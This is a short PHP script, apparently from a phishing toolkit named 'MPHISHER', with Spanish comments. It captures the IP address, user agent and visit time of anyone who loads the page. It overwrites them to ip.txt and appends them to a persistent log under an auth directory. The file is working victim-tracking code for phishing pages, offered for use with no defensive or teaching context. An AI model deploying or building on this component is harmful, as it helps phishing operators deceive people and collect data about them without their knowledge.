<?php
// MPHISHER - IP Capture
// Captura la IP del visitante

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// Guardar en archivo
$file = fopen("ip.txt", "w");
fwrite($file, "IP: " . $ip . "\n");
fwrite($file, "User-Agent: " . $user_agent . "\n");
fwrite($file, "Time: " . $time . "\n");
fclose($file);

// También guardar en log permanente
$log = fopen("../../auth/ip.txt", "a");
fwrite($log, "=== " . $time . " ===\n");
fwrite($log, "IP: " . $ip . "\n");
fwrite($log, "User-Agent: " . $user_agent . "\n");
fwrite($log, "\n");
fclose($log);
?>
